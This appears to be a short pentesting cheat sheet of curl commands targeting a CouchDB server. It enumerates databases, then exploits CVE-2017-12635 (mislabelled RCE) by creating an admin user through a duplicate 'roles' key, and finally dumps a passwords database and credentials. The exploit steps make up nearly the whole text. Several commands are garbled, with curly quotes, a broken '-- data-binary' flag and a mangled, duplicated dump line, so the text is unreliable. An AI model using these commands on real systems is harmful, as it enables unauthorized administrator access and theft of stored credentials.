```bash - kali
curl http://$TARGET:5984/
```
```bash - kali
curl -X GET http://$TARGET:5984/_all_dbs
```
```bash - kali
curl -X GET http://user:password@$TARGET:5984/_all_dbs
```
### CVE-2017-12635 RCE
#### Create user
```bash - kali
curl -X PUT ‘http://$TARGET:5984/_users/org.couchdb.user:chenny' -- data-binary ‘{ “type”: “user”, “name”: “chenny”, “roles”: [“_admin”], “roles”: [], “password”: “password” }’
```
#### Dump database
```bash - kali
curl http://$TARGET:5984/passwords/_all_docs?include_docs=true -u chenny:-Xpassword <ds/_all_docs?include_docs=true -u chenny:-Xpassword
```
#### Dump passwords
```bash - kali
curl -X GET http://user:passwords@$TARGET:5984/passwords
```